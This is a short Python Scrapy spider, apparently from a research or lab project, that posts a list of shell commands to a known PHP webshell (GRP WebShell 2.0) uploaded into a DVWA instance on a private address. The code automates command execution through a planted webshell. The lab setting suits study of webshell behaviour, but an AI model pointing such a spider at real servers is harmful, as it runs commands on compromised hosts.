from webshell_crawler.spiders.spider.abstractWebshell_post_spider import AbstractWebshellPostSpider


class webshellPostSpiderGRPWebshell(AbstractWebshellPostSpider):
    """
    webshell功能

    --  shell
    -- phpinfo
    """
    name = "webshell_post_GRPWebshell"
    url = "http://10.108.114.132/dvwa/hackable/uploads/php-webshells-master/GRP%20WebShell%202.0%20release%20build%202018%20(C)2006,Great.php"

    # 允许爬取的域名
    allowed_domains = AbstractWebshellPostSpider.allowed_domains
    # 这里存放要爬取的种子队列
    if url in AbstractWebshellPostSpider.available_urls:
        start_urls = [url]
    else:
        start_urls = []


    def submitPost(self, url):
        command_list = self.get_command_list()
        for cmd in command_list:
            payload = {'command': cmd, 'curdir': AbstractWebshellPostSpider.task_path, 'submit_btn': 'Execute Command'}
            yield self.submitPayload(url, payload)

